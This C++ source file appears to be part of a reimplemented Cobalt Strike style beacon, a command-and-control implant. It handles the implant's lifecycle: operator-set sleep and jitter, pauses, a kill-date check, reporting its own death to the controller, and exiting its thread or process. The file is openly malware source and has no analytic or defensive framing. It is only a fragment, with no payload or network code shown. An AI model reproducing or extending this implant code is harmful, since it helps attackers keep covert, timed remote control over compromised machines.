#include "pch.h"

#include "self.h"

#include "beacon.h"
#include "settings.h"

int gSleepTime;
int gJitter;

void Die(void)
{
	gSleepTime = 0;
	BeaconOutput(CALLBACK_DEAD, NULL, 0);
}

void SleepSet(char* buffer, int length)
{
	datap parser;
	BeaconDataParse(&parser, buffer, length);

	gSleepTime = BeaconDataInt(&parser);
	int jitter = BeaconDataInt(&parser);
	if (jitter >= 100)
		jitter = 0;
	gJitter = jitter;
	BeaconDataZero(&parser);
}

void Pause(char* buffer, int length)
{
	datap parser;
	BeaconDataParse(&parser, buffer, length);

	int millis = BeaconDataInt(&parser);

	Sleep(millis);
}

BOOL BeaconIsExpired()
{
	if(S_KILLDATE)
	{
		SYSTEMTIME now;
		GetSystemTime(&now);

		long time = now.wDay + 100 * (now.wMonth + 100 * now.wYear);
		return time >= S_KILLDATE;
	}

	return FALSE;
}

[[noreturn]] void BeaconInterrupt()
{
	if(S_EXIT_FUNK == TRUE)
	{
		if (S_CFG_CAUTION == TRUE)
		{
			while (TRUE)
				Sleep(1000);
		}
		else
		{
			ExitThread(0);
		}
	} else {
		if (S_CFG_CAUTION == TRUE) {
			HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ExitProcess, NULL, 0, NULL);
			WaitForSingleObject(hThread, INFINITE);
		}
		else
		{
			ExitProcess(0);
		}
	}
}